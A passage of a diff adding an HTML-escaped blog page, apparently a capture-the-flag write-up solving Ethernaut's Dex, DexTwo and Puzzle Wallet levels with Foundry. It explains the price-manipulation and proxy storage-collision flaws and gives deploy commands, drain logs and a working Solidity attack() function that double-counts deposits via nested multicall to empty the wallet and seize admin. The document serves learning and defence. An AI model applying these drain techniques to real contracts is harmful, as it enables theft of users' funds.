+    &lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;ds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forge&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;openzeppelin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contracts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openzeppelin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contracts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Setting up remappings for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foundry&lt;/code&gt; allows me to now import the openzeppelin contracts as `&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import &quot;openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this challenge, the player starts with 10 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token2&lt;/code&gt;. While the contract starts with 100 of each.&lt;/p&gt;
+
+&lt;p&gt;To exploit this level, we take advantage of the fact that when we swap against the DEX, the price moves in our favor, because $x_{to} = x_{from} * (N_{to})/(N_{from})$. In other words, if we swap all player’s tokens to 20 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token1&lt;/code&gt; , the DEX will now allow the player to swap 10 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token1&lt;/code&gt; for $10*(110/90) = 12$ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token2&lt;/code&gt; , so we just gained tokens out of thin air.&lt;/p&gt;
+
+&lt;p&gt;In fact, the strategy where we keep swapping from all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token1&lt;/code&gt; into all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token2&lt;/code&gt; , and vice versa  repeatedly, will result in the following decreasing DEX contract balances (see the source code &lt;a href=&quot;https://github.com/axucar/ethernaut-foundry/blob/main/src/AttackDex.sol&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AttackDex.sol&lt;/code&gt;&lt;/a&gt; and the corresponding test script &lt;a href=&quot;https://github.com/axucar/ethernaut-foundry/blob/main/test_archive/AttackDex.t.sol&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AttackDex.t.sol&lt;/code&gt;&lt;/a&gt; which we run via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge test -vvv --fork-url $ETH_RPC_URL&lt;/code&gt;  ).&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Logs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;Printing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;coin&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;balances&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEX&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that we have to be careful on the final swap to handle case where our swap conversion for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;from&lt;/code&gt; token balance to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;to&lt;/code&gt; token balance would exceed the reserves in the DEX contract.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lowerboundSwap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exceedsReserves&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getSwapPrice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;balanceOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exceedsReserves&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;balanceOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;dex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;        
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Deploy Attacker &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge create src/AttackDex.sol:AttackDex --verify --constructor-args &amp;lt;challenge_addr&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Approve coins for attacker contract to use, signed by player &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;dex_contract&amp;gt; &quot;approve(address,uint)&quot; &amp;lt;attacker_address&amp;gt; 9999&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Call attack method in attacker contract &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;attacker_address&amp;gt; &quot;attack()&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Indeed, we should find that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dex&lt;/code&gt; contract has been emptied of its &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token2&lt;/code&gt; coins.&lt;/p&gt;
+
+&lt;p&gt;One way to ameliorate such risk is to use multiple decentralised price oracles; otherwise, large pools of capital relative to trading liquidity can in practice manipulate prices on a DEX with similar simple pricing models. Adding slippage could be another option.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;dextwo&quot;&gt;DexTwo&lt;/h1&gt;
+
+&lt;p&gt;The key is that the DEX contract allows any ERC20 token to be swapped. Thus, we can exploit it by adding a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token3&lt;/code&gt; with minimal supply to the DEX, and allow us to get large quantities of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token1&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token2&lt;/code&gt; in exchange&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;deploy custom token contract, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token3&lt;/code&gt; which inherits from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ERC20&lt;/code&gt;
+    &lt;ol&gt;
+      &lt;li&gt;mint 1 token to DEX contract&lt;/li&gt;
+      &lt;li&gt;mint 3 tokens to Attacker contract&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;swap 1 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token3&lt;/code&gt; for 100 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token1&lt;/code&gt; since that is the ratio in the DEX&lt;/li&gt;
+  &lt;li&gt;swap 2 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token3&lt;/code&gt; for 100 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token2&lt;/code&gt; since that is the new ratio in the DEX&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;For reference, see the contract source code &lt;a href=&quot;https://github.com/axucar/ethernaut-foundry/blob/main/src/AttackDexTwo.sol&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AttackDexTwo.sol&lt;/code&gt;&lt;/a&gt; and the corresponding test script &lt;a href=&quot;https://github.com/axucar/ethernaut-foundry/blob/main/test_archive/AttackDexTwo.t.sol&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AttackDexTwo.t.sol&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;h1 id=&quot;puzzle-wallet&quot;&gt;Puzzle Wallet&lt;/h1&gt;
+
+&lt;p&gt;Storage layout for proxy contract has to match the logic contract; otherwise, we get a &lt;a href=&quot;https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#unstructured-storage-proxies&quot;&gt;storage collision&lt;/a&gt;. Thus, it is possible to overwrite the stored variables &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pendingAdmin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PuzzleProxy&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;owner&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxBalance&lt;/code&gt; respectively, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PuzzleWallet&lt;/code&gt; logic contract (and vice versa).&lt;/p&gt;
+
+&lt;p&gt;Since the goal is to set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setMaxBalance&lt;/code&gt; function, which requires the challenge contract to have 0 balance, we exploit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multicall&lt;/code&gt; function to register balance for twice the amount that we deposit. Thus, we can withdraw more than we put into the contract (thus emptying the challenge contract).&lt;/p&gt;
+
+&lt;p&gt;Within a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multicall&lt;/code&gt; call, we can only call deposit &lt;strong&gt;once.&lt;/strong&gt; So it suffices to either do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multicall[deposit(), multicall([deposit()])]&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multicall[multicall([deposit()]), multicall([deposit()])]&lt;/code&gt; . What does &lt;strong&gt;not&lt;/strong&gt; work is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multicall([deposit(), deposit()])&lt;/code&gt; , which returns an “Deposit can only be called once” error.&lt;/p&gt;
+
+&lt;p&gt;The result of this is we are able to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deposit&lt;/code&gt; twice (registering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msg.value&lt;/code&gt; twice) while only sending ETH once!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Steps to complete&lt;/strong&gt;:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Create attacker contract with enough ether to conduct attack&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge create src/AttackPuzzleWallet.sol:AttackPuzzleWallet --value 0.001ether --verify --constructor-args &amp;lt;challenge_addr&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Call attack &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;attacker_contract&amp;gt; &quot;attack()”&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;//sets owner
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proposeNewAdmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; 
+    &lt;span class=&quot;c1&quot;&gt;//as attacker is owner, it can add itself to whitelist
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addToWhitelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;//we are only allowed to call deposit once in the multicall    
+&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;depositcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;deposit()&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wrapped_depositcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[](&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;wrapped_depositcall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;depositcall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;//we wrap a deposit in another multicall
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;//ie., multicall(deposit,multicall(deposit))
+&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nestedCall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[](&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nestedCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;depositcall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        
+    &lt;span class=&quot;n&quot;&gt;nestedCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multicall(bytes[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wrapped_depositcall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+    &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amtToDrain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;balance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+    &lt;span class=&quot;c1&quot;&gt;//take credit for existing balance of victim contract, as well as the balance we added
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;multicall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amtToDrain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nestedCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                
+    &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amtToDrain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//drain the puzzlewallet contract
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setMaxBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can verify in the game console that the storage slot 1 (corresponding to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;) has been successfully updated to our address&lt;/p&gt;
+&lt;ul&gt;
